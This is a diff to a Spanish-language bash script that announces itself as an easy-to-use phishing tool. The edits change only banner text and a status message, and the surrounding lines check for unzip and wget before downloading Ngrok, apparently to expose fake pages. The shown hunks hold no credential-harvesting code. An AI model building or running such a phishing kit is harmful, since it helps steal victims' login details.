@@ -238,13 +238,13 @@ printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
 printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
 printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
 printf "                                       |:  |:  1   |   |:  |    \n"
-printf "     \e[0m\e[1;77m sploid Andres\e[1;31m |::.|::.. . |   |::.|    \n"
+printf "     \e[0m\e[1;77m Phishing\e[1;31m    |::.|::.. . |   |::.|    \n"
 printf "                                        --- -------     ---     \n"
                                           
 printf "\n"
-printf "\e[1;77m       .........\e[0m\e[1;93m modificado 02-09-2019\e[0m\e[1;77m...........\e[0m\n" 
-printf "\e[1;77m       .............\e[0m\e[1;93m Phishing facil de usar \e[0m\e[1;77m.............\e[0m\n"                              
-printf "\e[1;93m       .....\e[0m\e[1;92m Porque el conocimiento debe ser libre\e[0m \e[1;93m......\e[0m\n"
+printf "\e[1;77m       ...........\e[0m\e[1;93m modificado 02-09-2019 V1.0.17\e[0m\e[1;77m.........\e[0m\n" 
+printf "\e[1;77m       .............\e[0m\e[1;93m Phishing Andres \e[0m\e[1;77m....................\e[0m\n"                              
+printf "\e[1;93m       ...\e[0m\e[1;92m Aun en beta este shell, villavicencio (meta)\e[0m \e[1;93m....\e[0m\n"
 printf "\n"
 
 }
@@ -416,7 +416,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Necesita unzip pero no está instalado. Instalarlo. Saliendo."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "Necesita wget pero no está instalado. Instalarlo. Saliendo."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok espere un momento...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
